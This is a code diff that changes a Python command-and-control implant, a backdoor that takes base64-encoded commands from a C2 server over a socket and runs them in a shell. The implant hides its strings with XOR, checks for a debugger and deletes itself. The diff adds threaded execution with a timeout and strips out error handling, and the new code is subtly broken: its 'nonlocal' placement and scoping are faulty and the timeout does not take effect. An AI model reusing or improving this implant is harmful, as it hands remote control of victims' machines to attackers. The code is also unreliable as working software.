@@ -4,6 +4,7 @@ import base64
 import os
 import sys
 import ctypes
+import threading
 
 current_dir = os.path.abspath(os.getcwd())
 
@@ -23,9 +24,9 @@ STR_SENDING_OUTPUT = "\x11',&+,%b-76276" #bitwise XOR of msg - "Sending output" 
 STR_CONNECTED_TO_SERVER = "\x01-,,'!6'&b6-b\x01pb1'04'0" #bitwise XOR of msg - "Connected to C2 server" with 0x42
 STR_COMMAND_TOOK_LONG = "\x01-//#,&b6--)b6--b.-,%b6-b':'!76'" #bitwise XOR of msg - "Command took too long to execute" with 0x42
 STR_HOST = "vvlppplpp{lpqt" #bitwise XOR of 127.0.0.1
+STR_CD = "\x01*#,%'&b&+0'!6-0;b6-b"#bitwise XOR of Changed directory to
 
-
-def is_debugger_present():
+def check_debugger():
     '''
     Check if the code is being run under debugger in Windows target machine
     '''
@@ -34,23 +35,31 @@ def is_debugger_present():
     except AttributeError:
         return False
 
-def execute_command( cmd ):
+def execute_command(cmd):
     '''
-    Execute the given command line instruction
+    Execute the given command line instruction.
     '''
     global current_dir
-    try:
-        if cmd.startswith( "cd " ): # special logic for cd instructions
-            os.chdir( os.path.join(current_dir, cmd[3:]) )
+
+    def target():
+        if cmd.startswith( "cd " ):  # special logic for cd instructions
+            os.chdir( os.path.join( current_dir , cmd[ 3 : ] ) )
             current_dir = os.path.abspath( os.getcwd() )
-            return "Changed directory to " + current_dir
+            nonlocal output
+            output = obfuscate( STR_CD ) + current_dir
         else:
-            process = subprocess.Popen(cmd, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE,
-            cwd = current_dir)
-            output, error = process.communicate()
-            return output.decode() + error.decode()
-    except Exception as e:
-        return str( e )
+            process = subprocess.Popen( cmd , shell = True , stdout = subprocess.PIPE , stderr = subprocess.PIPE , cwd = current_dir )
+            out, err = process.communicate()
+            nonlocal output
+            output = out.decode() + err.decode()
+
+    output = "Command took too long to execute"
+    thread = threading.Thread( target = target )
+    thread.start()
+    thread.join( timeout = 10 )
+    if thread.is_alive():
+        thread.join()
+    return output
 
 def send_all( sock , data ):
     '''
@@ -65,20 +74,16 @@ def self_destruct():
     Destroy the file in which this function resides
     '''
     print( STR_SELF_DESTRUCT_INITIATED )
-    try:
-        os.remove( sys.argv[0] )
-    except Exception as e:
-        print( STR_SELF_DESTRUCT_FAILED )
-    finally:
-        sys.exit()
+    os.remove( sys.argv[ 0 ] )
+    sys.exit()
 
 def main():
     '''
     Main entry function for implant
     '''
-    host = obfuscate( STR_HOST , key = 0x42 )
+    host = obfuscate( STR_HOST  )
     port = 9999
-    if is_debugger_present():
+    if check_debugger():
         print( STR_DEBUGGER_DETECTED )
         self_destruct()
 
@@ -92,7 +97,7 @@ def main():
                 break
 
             cmd = base64.b64decode( encoded_cmd ).decode()
-            if cmd == obfuscate( STR_SELF_DESTRUCT , 0x42):
+            if cmd == obfuscate( STR_SELF_DESTRUCT ):
                 self_destruct()
 
             print( STR_COMMAND_RECEIVED )
